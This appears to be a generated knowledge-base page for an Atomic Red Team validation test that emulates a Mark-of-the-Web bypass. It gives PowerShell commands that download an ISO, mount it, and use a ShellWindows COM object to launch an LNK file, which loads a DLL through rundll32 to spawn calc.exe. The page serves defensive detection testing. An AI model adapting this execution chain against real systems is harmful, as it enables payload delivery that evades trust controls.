---
atomic_guid: "c2587b8d-743d-4985-aa50-c83394eaeb68"
title: "Execute LNK file from ISO"
framework: "atomic"
generated: "true"
attack_technique_id: "T1553.005"
attack_technique_name: "Subvert Trust Controls: Mark-of-the-Web Bypass"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.005/T1553.005.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "c2587b8d-743d-4985-aa50-c83394eaeb68"
  - "Execute LNK file from ISO"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Execute LNK file from ISO

Executes LNK file document.lnk from AllTheThings.iso. Link file executes cmd.exe and rundll32 to in order to load and execute AllTheThingsx64.dll from the ISO which spawns calc.exe.

## Metadata

- Atomic GUID: c2587b8d-743d-4985-aa50-c83394eaeb68
- Technique: T1553.005: Subvert Trust Controls: Mark-of-the-Web Bypass
- Platforms: windows
- Executor: powershell
- Dependency Executor: powershell
- Source Path: atomics/T1553.005/T1553.005.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1553-subvert_trust_controls|T1553.005]]

## Input Arguments

### path_of_iso

- description: Path to ISO file
- type: path
- default: PathToAtomicsFolder\T1553.005\bin\AllTheThings.iso

## Dependencies

AllTheThings.iso must exist on disk at specified location (#{path_of_iso})

### Prerequisite Check

```powershell
if (Test-Path "#{path_of_iso}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory (split-path "#{path_of_iso}") -ErrorAction ignore | Out-Null
Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/AllTheThings.iso -OutFile "#{path_of_iso}"
```

## Executor

- name: powershell

### Command

```powershell
Mount-DiskImage -ImagePath "#{path_of_iso}" -StorageType ISO -Access ReadOnly
$keep = Get-Volume -FileSystemLabel "AllTheThings"
$driveLetter = ($keep | Get-Volume).DriveLetter
$instance = [activator]::CreateInstance([type]::GetTypeFromCLSID("{c08afd90-f2a1-11d1-8455-00a0c91f3880}"))
$instance.Document.Application.ShellExecute($driveLetter+":\document.lnk","",$driveLetter+":\",$null,0)
```

### Cleanup

```powershell
Dismount-DiskImage -ImagePath "#{path_of_iso}" | Out-Null
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.005/T1553.005.yaml)
